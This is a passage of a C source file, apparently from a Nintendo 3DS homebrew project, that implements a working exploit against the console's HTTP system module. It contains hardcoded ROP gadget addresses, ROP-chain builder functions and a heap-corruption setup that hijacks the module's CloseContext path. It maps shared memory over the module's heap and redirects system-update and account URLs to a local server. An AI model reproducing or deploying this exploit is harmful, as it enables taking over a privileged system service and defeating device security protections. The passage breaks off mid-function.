#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <3ds.h>

extern vu32 *httpheap_sharedmem;
extern vu32 *ropvmem_sharedmem;

extern u8 *http_codebin_buf;
extern u32 *http_codebin_buf32;
extern u32 http_codebin_size;

u32 ROP_LDRR4R6_R5x1b8_OBJVTABLECALLx8 = 0x0010264c;//Load r4 from r5+0x1b8 and r6 from r5+0x1bc. Set r0 to r4. Load the vtable addr + funcptr using just r1 and blx to r1(vtable funcptr +8).
u32 ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 = 0x00114b30;//Load ip from r0+0(vtable ptr). Load r1 from r4+0xc, r2 from r4+0x14, and r3 from r4+0x4. Then load ip from ip+0x18(vtable+0x18) and blx to ip.
u32 ROP_STACKPIVOT = 0x00107b08;//Add sp with r3 then pop-pc.

u32 ROP_POPPC = 0x00100208;//"pop {pc}"

u32 ROP_POPR4R5R6PC = 0x00100248;//"pop {r4, r5, r6, pc}"

u32 ROP_POPR1PC = 0x0010cf64;//"pop {r1, pc}"
u32 ROP_POPR3PC = 0x00106a28;//"pop {r3, pc}"

u32 ROP_LDRR0R1 = 0x00101c64;//Load r0 from r1, then bx-lr.
u32 ROP_STRR0_R1x4 = 0x00101c8c;//Store r0 to r1+4, then bx-lr.

u32 ROP_BLXR3_ADDSP12_POPPC = 0x00119438;//"blx r3" "add sp, sp, #12" "pop {pc}"

u32 ROP_STRR7_R5x48_POPR4R5R6R7R8PC = 0x00102430;//Write r7 to r5+0x48. "pop {r4, r5, r6, r7, r8, pc}"

u32 ROP_POP_R4R5R6R7R8R9SLFPIPPC = 0x00102e10;//"pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}"

u32 ROP_ADDR0IP = 0x0010bc2c;//r0+= ip, bx-lr.

u32 ROP_MOVR0R4_POPR4PC = 0x00100698;//"mov r0, r4" "pop {r4, pc}"

u32 ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP = 0x0010f9f0;//"mov r3, r0" "mov r2, r0" "mov r1, r0" "blx ip"

u32 ROP_BLXIP_POPR3PC = 0x00118c08;//"blx ip" "pop {r3, pc}"

u32 ROP_ADDSPx3C_POPPC = 0x00100204;//sp+=0x3c, then pop-pc.

u32 ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC = 0x00109148;

u32 ROP_MOVR0_VAL0_BXLR = 0x00104e20;//r0=0x0, bx-lr.

u32 ROP_CMPR0R1_OVERWRITER0_BXLR = 0x00118400;//"cmp r0, r1" On mismatch r0 is set to data from .pool, otherwise r0=0. Then bx-lr.

u32 ROP_CONDEQ_BXLR_VTABLECALL = 0x00119a24;//"beq <addr of bx-lr>" Otherwise, ip = *r0(vtable ptr), ip = *(ip+0xcc), then bx ip.

u32 ROP_strncmp = 0x001064dc;
u32 ROP_strncpy = 0x0010dc88;
u32 ROP_memcpy = 0x0010d274;
u32 ROP_svcControlMemory = 0x00100770;
u32 ROP_CreateContext = 0x0011689c;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
u32 ROP_HTTPC_CMDHANDLER_CREATECONTEXT = 0x00114b4c;//This is the start of the code in the httpc_cmdhandler which handles the CreateContext cmd, starting with "ldr r7, =<cmdhdr>".

u32 ROP_HTTPC_CMDHANDLER_RETURN = 0x00114bf4;//Code to jump to in httpc_cmdhandler for returning from that function.

u32 ROP_sharedmem_create = 0x001045a4;

u32 ROP_http_context_getctxptr = 0x0010b8d8;//inr0=_this inr1=contexthandle

u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.

u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE = 0x0011b5dc;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the main service-session.

u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE = 0x0011b744;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the context-session.
u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;

u32 ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE = 0x108;//Size of the vtable for the objptr from httpc_cmdhandler *(_this+16).

static u32 ropvmem_base = 0x0f000000;
u32 ropvmem_size = 0x4000;

u32 httpheap_size = 0x22000;

static u32 __custom_mainservsession_vtable;
static u32 condcallfunc_objaddr;

static u32 __httpmainthread_cmdhandler_stackframe = 0x0ffffe28;

static u32 ropheap = 0x0ffff000;//Main-thread stack-bottom.

typedef enum {
	TARGETURLCAP_AddRequestHeader = 1<<0, //Override the value-data used for certain headers.
	TARGETURLCAP_AddPostDataAscii = 1<<1, //Override the value-data used for certain form-fields.
	TARGETURLCAP_SendPOSTDataRawTimeout = 2<<0, //NOP SendPOSTDataRawTimeout.
} targeturl_caps;//Bitmask of capabilities, 0 = none(vtable-ptr is left at the original one).

typedef struct {
	targeturl_caps caps;
	u32 vtableptr;
	u32 *vtable_sharedmemptr;
	char url[0x100];//Target URL to compare the CreateContext input URL with. The compare will not include the NUL-terminator in this target URL, hence the check will pass when there's additional chars following the matched URL. This is needed due to the multiple account.nintendo.net URLs that need targeted + handled all the same way.
	char new_url[0x100];//Optional, when set the specified URL will overwrite the URL used with CreateContext, NUL-terminator included.
} targeturlctx;

targeturlctx targeturl_list[] = {
	{//This is the URL used for doing the actual sysupdate check / getting the the list of sysupdate titles.
		.caps = TARGETURLCAP_SendPOSTDataRawTimeout,
		.url = "https://nus.c.shop.nintendowifi.net/nus/services/NetUpdateSOAP",
		.new_url = "http://10.0.0.30/ctr-httpwn/NetUpdateSOAP"
	},

	{//NNID
		.caps = TARGETURLCAP_AddRequestHeader,
		.url = "https://account.nintendo.net/"
	},

	{//Used by friends-sysmodule and AC-sysmodule, however it's unknown if AC ever runs the code for it.
		.caps = TARGETURLCAP_AddRequestHeader | TARGETURLCAP_AddPostDataAscii,
		.url = "https://nasc.nintendowifi.net/ac"
	},

	/*
	{//Browser-version-check. Disabled since this is useless without an implemented method for overwriting main-serv-sessions' httpc_cmdhandler obj+16 vtableptr, after the initial ctr-httpwn run.
		.url = "https://cbvc.cdn.nintendo.net/",
		.new_url = "http://10.0.0.30/ctr-httpwn/cbvc"//Just a static page returning '0'.
	}*/
};

void ropgen_addword(u32 **ropchain, u32 *http_ropvaddr, u32 value)
{
	u32 *ptr = *ropchain;

	*ptr = value;

	(*ropchain)++;
	(*http_ropvaddr)+=4;
}

void ropgen_addwords(u32 **ropchain, u32 *http_ropvaddr, u32 *buf, u32 total_words)
{
	u32 *ptr = *ropchain;

	if(buf)
	{
		memcpy(ptr, buf, total_words*4);
	}
	else
	{
		memset(ptr, 0, total_words*4);
	}

	(*ropchain)+=total_words;
	(*http_ropvaddr)+= total_words*4;
}

void ropgen_popr1(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x8-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_POPR1PC);
	ropgen_addword(ropchain, http_ropvaddr, value);
}

void ropgen_popr3(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x8-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_POPR3PC);
	ropgen_addword(ropchain, http_ropvaddr, value);
}

void ropgen_setr0(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x10-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR0R4_POPR4PC + 4);//"pop {r4, pc}"
	ropgen_addword(ropchain, http_ropvaddr, value);

	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR0R4_POPR4PC);
	ropgen_addword(ropchain, http_ropvaddr, 0);
}

void ropgen_setr4(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x8-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR0R4_POPR4PC + 4);//"pop {r4, pc}"
	ropgen_addword(ropchain, http_ropvaddr, value);
}

void ropgen_popr4r5r6pc(u32 **ropchain, u32 *http_ropvaddr, u32 r4, u32 r5, u32 r6)//Total size: 0x10-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_POPR4R5R6PC);
	ropgen_addword(ropchain, http_ropvaddr, r4);
	ropgen_addword(ropchain, http_ropvaddr, r5);
	ropgen_addword(ropchain, http_ropvaddr, r6);
}

void ropgen_popr4r5r6r7r8pc(u32 **ropchain, u32 *http_ropvaddr, u32 r4, u32 r5, u32 r6, u32 r7, u32 r8)//Total size: 0x18-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_STRR7_R5x48_POPR4R5R6R7R8PC+4);
	ropgen_addword(ropchain, http_ropvaddr, r4);
	ropgen_addword(ropchain, http_ropvaddr, r5);
	ropgen_addword(ropchain, http_ropvaddr, r6);
	ropgen_addword(ropchain, http_ropvaddr, r7);
	ropgen_addword(ropchain, http_ropvaddr, r8);
}

void ropgen_popr4r5r6r7r8r9slfpippc(u32 **ropchain, u32 *http_ropvaddr, u32 *regs)//Total size: 0x28-bytes.
{
	ropgen_addword(ropchain, http_ropvaddr, ROP_POP_R4R5R6R7R8R9SLFPIPPC);

	ropgen_addwords(ropchain, http_ropvaddr, regs, 9);
}

void ropgen_blxr3(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 writestackret)//Total size: 0xc-bytes + <0xc if writestackret is set>.
{
	ropgen_popr3(ropchain, http_ropvaddr, addr);

	ropgen_addword(ropchain, http_ropvaddr, ROP_BLXR3_ADDSP12_POPPC);

	if(writestackret)
	{
		ropgen_addwords(ropchain, http_ropvaddr, 0, 3);
	}
}

void ropgen_setr0r2r1(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x3c-bytes.
{
	u32 regs[9] = {0};

	ropgen_setr0(ropchain, http_ropvaddr, value);

	regs[8] = ROP_POPPC;

	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);

	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP + 4);
}

void ropgen_movr1r0(u32 **ropchain, u32 *http_ropvaddr)//Total size: 0x2c-bytes.
{
	u32 regs[9] = {0};

	regs[8] = ROP_POPPC;

	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);

	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP + 8);
}

void ropgen_ldrr0r1(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 set_addr)//Total size: 0x18-bytes + <0x8 if set_addr is set>.
{
	if(set_addr)ropgen_popr1(ropchain, http_ropvaddr, addr);

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_LDRR0R1, 1);
}

void ropgen_strr0r1(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 set_addr)//Total size: 0x18-bytes + <0x8 if set_addr is set>.
{
	if(set_addr)ropgen_popr1(ropchain, http_ropvaddr, addr-4);

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_STRR0_R1x4, 1);
}

void ropgen_copyu32(u32 **ropchain, u32 *http_ropvaddr, u32 ldr_addr, u32 str_addr, u32 set_addr)//Total size: 0x30-bytes + <0x8 if set_addr bit0 is set> + <0x8 if set_addr bit1 is set>.
{
	ropgen_ldrr0r1(ropchain, http_ropvaddr, ldr_addr, set_addr & 0x1);
	ropgen_strr0r1(ropchain, http_ropvaddr, str_addr, set_addr & 0x2);
}

void ropgen_writeu32(u32 **ropchain, u32 *http_ropvaddr, u32 value, u32 addr, u32 set_addr)//Total size: 0x28-bytes + <0x8 if set_addr is set>.
{
	ropgen_setr0(ropchain, http_ropvaddr, value);
	ropgen_strr0r1(ropchain, http_ropvaddr, addr, set_addr);
}

void ropgen_stackpivot(u32 **ropchain, u32 *http_ropvaddr, u32 addr)//Total size: 0x8-bytes.
{
	u32 ROP_STACKPIVOT_POPR3 = ROP_STACKPIVOT-4;//"pop {r3}", then the code from ROP_STACKPIVOT.

	ropgen_addword(ropchain, http_ropvaddr, ROP_STACKPIVOT_POPR3);
	ropgen_addword(ropchain, http_ropvaddr, addr - (*http_ropvaddr + 4));
}

void ropgen_add_r0ip(u32 **ropchain, u32 *http_ropvaddr, u32 addval)//Add the current value of r0 with addval. Total size: 0x40-bytes.
{
	u32 regs[9] = {0};

	regs[8] = addval;

	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_ADDR0IP, 1);
}

void ropgen_blxip_popr3pc(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 r3val)//Total size: 0x30-bytes.
{
	u32 regs[9] = {0};

	regs[8] = addr;

	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);

	ropgen_addword(ropchain, http_ropvaddr, ROP_BLXIP_POPR3PC);
	ropgen_addword(ropchain, http_ropvaddr, r3val);
}

void ropgen_callfunc(u32 **ropchain, u32 *http_ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x74-bytes. params[0](r0) is at offset 0x40. params[1](r1) is at offset 0x50.
{
	ropgen_setr0r2r1(ropchain, http_ropvaddr, params[2]);
	ropgen_setr0(ropchain, http_ropvaddr, params[0]);

	ropgen_popr1(ropchain, http_ropvaddr, params[1]);

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_POPR3PC, 0);
	ropgen_addword(ropchain, http_ropvaddr, params[3]);

	ropgen_addword(ropchain, http_ropvaddr, funcaddr);

	ropgen_addwords(ropchain, http_ropvaddr, &params[4], 3);
}

void ropgen_checkcond(u32 **ropchain, u32 *http_ropvaddr, u32 pivot_addr0, u32 pivot_addr1, u32 type)//Total size: 0x40-bytes(0x48 for non-type0). This compares the values already stored in r0 and r1. Type0: on match this just continues running the ROP following this, otherwise this pivots to pivot_addr1. Type1: on match pivot to pivot_addr0, otherwise pivot to pivot_addr1. When pivot_addr1 is 0, it's set to the address of the ROP following this.
{
	u32 addr;

	ropgen_blxr3(ropchain, http_ropvaddr, ROP_CMPR0R1_OVERWRITER0_BXLR, 1);

	ropgen_setr0(ropchain, http_ropvaddr, condcallfunc_objaddr);
	ropgen_blxr3(ropchain, http_ropvaddr, ROP_CONDEQ_BXLR_VTABLECALL, 0);

	addr = pivot_addr1;
	if(addr==0)
	{
		addr = (*http_ropvaddr) + 0xc;
		if(type)addr+= 0x8;
	}

	ropgen_stackpivot(ropchain, http_ropvaddr, addr);
	ropgen_addword(ropchain, http_ropvaddr, 0);

	if(type)ropgen_stackpivot(ropchain, http_ropvaddr, pivot_addr0);
}

void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u32 addr0, u32 addr1, u32 size, MemOp op, MemPerm perm)//Total size: see ropgen_callfunc.
{
	u32 params[7] = {0};

	params[0] = outaddr;
	params[1] = addr0;
	params[2] = addr1;
	params[3] = size;
	params[4] = op;
	params[5] = perm;

	ropgen_callfunc(ropchain, http_ropvaddr, ROP_svcControlMemory, params);
}

void ropgen_strncpy(u32 **ropchain, u32 *http_ropvaddr, u32 dest, u32 src, u32 n)
{
	u32 params[7] = {0};

	params[0] = dest;
	params[1] = src;
	params[2] = n;

	ropgen_callfunc(ropchain, http_ropvaddr, ROP_strncpy, params);
}

void ropgen_memcpy(u32 **ropchain, u32 *http_ropvaddr, u32 dst, u32 src, u32 size)//Total size: see ropgen_callfunc.
{
	u32 params[7] = {0};

	params[0] = dst;
	params[1] = src;
	params[2] = size;

	ropgen_callfunc(ropchain, http_ropvaddr, ROP_memcpy, params);
}

void ropgen_sharedmem_create(u32 **ropchain, u32 *http_ropvaddr, u32 ctx, u32 addr, u32 size, MemPerm mypermission, MemPerm otherpermission)//Total size: see ropgen_callfunc.
{
	u32 params[7] = {0};

	params[0] = ctx;
	params[1] = addr;
	params[2] = size;
	params[3] = mypermission;
	params[4] = otherpermission;

	ropgen_callfunc(ropchain, http_ropvaddr, ROP_sharedmem_create, params);
}

u32 memalloc_ropvmem_dataheap(u32 *curptr, u32 **sharedmem_ptr, u32 size)
{
	*curptr-= size;

	*sharedmem_ptr = (u32*)&ropvmem_sharedmem[((*curptr) - ropvmem_base) >> 2];

	return *curptr;
}

Result init_hax_sharedmem(u32 *tmpbuf)
{
	u32 sharedmembase = 0x10006000;
	u32 target_overwrite_addr;
	u32 object_addr = sharedmembase + 0x200;
	u32 *initialhaxobj = &tmpbuf[0x200>>2];
	u32 *haxobj1 = &tmpbuf[0x400>>2];
	u32 *ropchain = &tmpbuf[0x520>>2];
	u32 http_ropvaddr = sharedmembase+0x520;

	u32 *ropchain_ret2http = &tmpbuf[0xfd0>>2];
	u32 ret2http_vaddr = sharedmembase+0xfd0;

	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.

	u32 regs[9] = {0};

	//u32 tmpval;
	u32 tmpdata[2];
	u32 *tmpdata_ptr, tmpdata_addr;

	u32 sharedmemvaddr_ctx0 = ropheap+0x0;
	u32 sharedmemvaddr_ctx1 = ropheap+0x20;

	target_overwrite_addr = closecontext_stackframe;
	target_overwrite_addr-= 0xc;//Subtract by this value to get the address of the saved r5 which will be popped.

	//Overwrite the prev/next memchunk ptrs in the CTRSDK freemem memchunkhdr following the allocated struct for the POST data.
	//Once the free() is finished, object_addr will be written to target_overwrite_addr, etc.
	tmpbuf[0x44>>2] = target_overwrite_addr - 0xc;
	tmpbuf[0x48>>2] = object_addr;

	//Once http-sysmodule returns into the actual-CloseContext-function, r5 will be overwritten with object_addr. Then it will eventually call vtable funcptr +4 with this object. Before doing so this CloseContext function will write val0 to the two words @ obj+8 and obj+4.

	initialhaxobj[0] = object_addr+0x100;//Set the vtable to sharedmem+0x300.
	initialhaxobj[1] = object_addr+4;//Set obj+4 to the addr of obj+4, so that most of the linked-list code is skipped over.
	tmpbuf[(0x300+4) >> 2] = ROP_LDRR4R6_R5x1b8_OBJVTABLECALLx8;//Set the funcptr @ vtable+4. This where the hax initially gets control of PC. Once this ROP finishes it will jump to ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 below.

	initialhaxobj[0x1b8>>2] = object_addr+0x200;//Set the addr of haxobj1 to sharedmem+0x400(this object is used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8).

	haxobj1[0] = sharedmembase+0x500;
	//Setup the regs loaded by ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18.
	haxobj1[0xc>>2] = 0;//r1
	haxobj1[0x14>>2] = 0;//r2
	haxobj1[0x4>>2] = (sharedmembase+0x520) - closecontext_stackframe;//r3

	//Init the vtable for haxobj1.
	tmpbuf[(0x500+8) >> 2] = ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18;//Init the funcptr used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8. Once this ROP finishes it will jump to ROP_STACKPIVOT.
	tmpbuf[(0x500+0x18) >> 2] = ROP_STACKPIVOT;//Stack-pivot to sharedmem+0x520.

	//Setup the actual ROP-chain.

	//Write the current r7 value which isn't corrupted yet, to the ret2http ROP.
	ropgen_popr4r5r6pc(&ropchain, &http_ropvaddr, 0, ret2http_vaddr + 0x10 - 0x48, 0);
	ropgen_addword(&ropchain, &http_ropvaddr, ROP_STRR7_R5x48_POPR4R5R6R7R8PC);
	ropgen_addwords(&ropchain, &http_ropvaddr, 0, 5);

	//Copy the original r5 value from the original thread stack, to the ropchain data so that it's popped into r5.
	ropgen_copyu32(&ropchain, &http_ropvaddr, closecontext_stackframe - 8*4, ret2http_vaddr + 0x8, 0x3);

	//Likewise for r4.
	ropgen_copyu32(&ropchain, &http_ropvaddr, closecontext_stackframe - 2*4, ret2http_vaddr + 0x4, 0x3);

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0x10, 1);//Load the r7 value from above into r0.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x98);//r0 = original value of r6(original_r7+0x98).
	ropgen_strr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0xc, 1);//Write the calculated value for the original r6, to the ret2http ROP.

	ropgen_svcControlMemory(&ropchain, &http_ropvaddr, http_ropvaddr+12, ropvmem_base, 0, ropvmem_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);

	//Create sharedmem over the entire sysmodule heap, prior to the SOC-sharedmem.
	ropgen_sharedmem_create(&ropchain, &http_ropvaddr, sharedmemvaddr_ctx1, 0x08000000, httpheap_size, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);

	//Create sharedmem over the ropvmem.
	ropgen_sharedmem_create(&ropchain, &http_ropvaddr, sharedmemvaddr_ctx0, ropvmem_base, ropvmem_size, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);

	//Setup the stack data which will be used once the above CreateContext vtable funcptr is used. This will stack-pivot to ropvmem_base.
	
	//The below commented block is actually for the context-session thread stack.
	/*tmpval = closecontext_stackframe + 0x18 + 0x3c;
	ropgen_setr0(&ropchain, &http_ropvaddr, ROP_STACKPIVOT-4);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpval, 1);
	tmpval+= 4;
	ropgen_setr0(&ropchain, &http_ropvaddr, ropvmem_base - (tmpval + 4));
	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpval, 1);*/

	//Setup the stack-pivot mentioned above on the main-thread stack.
	tmpdata_ptr = tmpdata;
	tmpdata_addr = 0x0fffff9c;
	ropgen_stackpivot(&tmpdata_ptr, &tmpdata_addr, ropvmem_base);
	tmpdata_addr-= 8;

	ropgen_setr0(&ropchain, &http_ropvaddr, tmpdata[0]);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpdata_addr, 1);
	ropgen_setr0(&ropchain, &http_ropvaddr, tmpdata[1]);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpdata_addr+4, 1);

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe + 0x14, 1);//Load the saved LR value in the httpc_cmdhandler func.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0xc);//r0+= 0xc.
	ropgen_strr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe + 0x14, 1);//Write the modified LR value back into the stackframe. Hence, the code which writes to the cmd-reply data will be skipped over.

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0xfffffffc);
	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf-4
	ropgen_setr0(&ropchain, &http_ropvaddr, 0x00030045);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[0] = 0x00030045

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf
	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[1] = 0x0

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x4);//r0+= 0x4.
	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0x4
	ropgen_setr0(&ropchain, &http_ropvaddr, 0x10 | ((0x2-1)<<26));
	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[2] = <translate-header for sending two handles which get closed in the HTTP process>

	//Write the httpheap sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, sharedmemvaddr_ctx1+0x14, 1);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, http_ropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x8);//r0+= 0x8.
	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0x8
	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[3] = <value written by the above ROP>

	//Write the ropvmem sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, sharedmemvaddr_ctx0+0x14, 1);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, http_ropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0xc);//r0+= 0xc.
	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0xc
	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[4] = <value written by the above ROP>

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x10);//r0+= 0x10.
	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0x10
	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[5] = 0x0

	//Write the ssl:C handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, ROP_SSLC_STATE + 24, 1);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, http_ropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);

	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x14);//r0+= 0x14.
	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0x14
	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[6] = <value written by the above ROP>

	ropgen_stackpivot(&ropchain, &http_ropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP-chain.

	if(http_ropvaddr > sharedmembase+0xfd0)
	{
		printf("http_ropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_ropvaddr - (sharedmembase+0xfd0)));
		return -2;
	}

	regs[7] = 0x0011c418;//Set fp to the original value.

	ropgen_popr4r5r6r7r8r9slfpippc(&ropchain_ret2http, &ret2http_vaddr, regs);//The register values here are overwritten by the above ROP. r8 doesn't matter here since it's not used before r8 gets popped from stack @ returning from the function which is jumped to below. Likewise for r9+sl, they get popped from the stack when httpc_cmdhandler() returns.

	//Return to executing the original sysmodule code.
	ropgen_stackpivot(&ropchain_ret2http, &ret2http_vaddr, closecontext_stackframe - 4);

	return 0;
}

Result setuphaxx_httpheap_sharedmem()
{
	u32 pos, i;
	u32 tmp_pos;
	u32 tmpval;

	u32 *ropchain = (u32*)ropvmem_sharedmem;
	u32 ropvaddr = ropvmem_base;

	u32 *ropchain0, ropvaddr0;
	u32 *ropchain1, ropvaddr1;
	u32 *ropchain2, ropvaddr2;

	u32 ropallocsize = 0x1000;
	u32 ropoffset = 0x200;
	u32 bakropoff = ropoffset + ropallocsize;
	u32 roplaunch_bakaddr;
	u32 roplaunch_baksize;

	u32 created_contexthandle_stackaddr;

	u32 *ptr;

	u32 params[7];

	u32 mainrop_endaddr;

	u32 *condcallfunc_objaddr_sharedmemptr = NULL;
	u32 *__custom_mainservsession_vtable_sharedmemptr = NULL;

	u32 targeturl_list_vaddr;
	u32 *targeturl_list_sharedmemptr = NULL;
	u32 targeturl_list_size, targeturl_list_entcount;
	targeturl_caps tmpcaps;

	mainrop_endaddr = ropvmem_base + ropvmem_size;

	condcallfunc_objaddr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &condcallfunc_objaddr_sharedmemptr, 0x8);

	__custom_mainservsession_vtable = memalloc_ropvmem_dataheap(&mainrop_endaddr, &__custom_mainservsession_vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);

	targeturl_list_size = sizeof(targeturl_list);
	targeturl_list_entcount = targeturl_list_size / sizeof(targeturlctx);
	targeturl_list_vaddr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &targeturl_list_sharedmemptr, targeturl_list_size);

	for(pos=0; pos<targeturl_list_entcount; pos++)
	{
		if(targeturl_list[pos].caps==0)continue;

		targeturl_list[pos].vtableptr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &targeturl_list[pos].vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
		
		for(i=0; i<targeturl_list_entcount; i++)
		{
			if(pos==i || targeturl_list[pos].caps != targeturl_list[i].caps)continue;

